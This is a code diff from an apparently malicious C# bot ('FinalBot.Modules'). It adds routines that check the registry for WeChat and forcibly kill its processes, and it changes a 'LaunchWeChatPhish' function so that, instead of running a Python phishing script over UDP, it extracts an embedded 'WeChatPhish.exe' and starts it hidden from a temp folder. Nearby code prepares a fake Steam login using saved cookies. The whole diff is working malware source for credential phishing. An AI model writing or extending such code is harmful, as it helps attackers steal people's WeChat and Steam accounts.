@@ -145,6 +145,35 @@ namespace FinalBot.Modules
             }
         }
 
+        public static bool IsWeChatInstalled()
+        {
+            string[] keys = { @"Software\Tencent\WeChat", @"Software\Tencent\Weixin" };
+            foreach (var keyPath in keys)
+            {
+                try
+                {
+                    using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(keyPath))
+                        if (key?.GetValue("InstallPath") != null) return true;
+                    using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(keyPath))
+                        if (key?.GetValue("InstallPath") != null) return true;
+                }
+                catch { }
+            }
+            return false;
+        }
+
+        public static void KillWeChat()
+        {
+            string[] targets = { "WeChat", "Weixin" };
+            foreach (var t in targets)
+            {
+                foreach (var p in Process.GetProcessesByName(t))
+                {
+                    try { p.Kill(true); } catch { }
+                }
+            }
+        }
+
         public static void LaunchSteamLogin(string lang = "en")
         {
             PrepareSteamFiles(_savedAgentName, _savedCookies, lang);
@@ -165,13 +194,13 @@ namespace FinalBot.Modules
 
         public static void LaunchWeChatPhish()
         {
-            string scriptPath = ExtractResource("core.wechat_phish.py", "wechat_phish.py");
-            if (!string.IsNullOrEmpty(scriptPath))
+            KillWeChat();
+            string exePath = ExtractResource("WeChatPhish.bin", "WeChatPhish.exe");
+            if (!string.IsNullOrEmpty(exePath) && File.Exists(exePath))
             {
                 Process.Start(new ProcessStartInfo
                 {
-                    FileName = "python",
-                    Arguments = $"\"{scriptPath}\" --udp 51337",
+                    FileName = exePath,
                     UseShellExecute = false,
                     CreateNoWindow = true,
                     WorkingDirectory = GetTempDir()
